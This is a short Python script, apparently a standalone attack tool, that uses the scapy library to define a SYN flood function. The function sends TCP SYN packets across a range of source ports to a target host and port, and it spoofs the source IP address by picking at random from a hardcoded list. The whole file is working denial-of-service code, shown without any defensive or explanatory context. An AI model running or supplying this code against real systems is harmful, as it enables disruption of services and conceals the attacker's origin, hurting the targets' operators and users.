#!/usr/bin/env python3
import random
from scapy.all import *

def synFlood(target, dPort):
	srcList = ['201.1.1.2','10.1.1.12','69.1.1.2','125.130.5.199']
	for sPort in range(1025,65535):
		index = random.randrange(4)
		ipLayer = IP(src=srcList[index],dst=target)
		tcpLayer = TCP(sport=sPort,dport=dPort,flags='S')
		packet = ipLayer/tcpLayer
		send(packet)
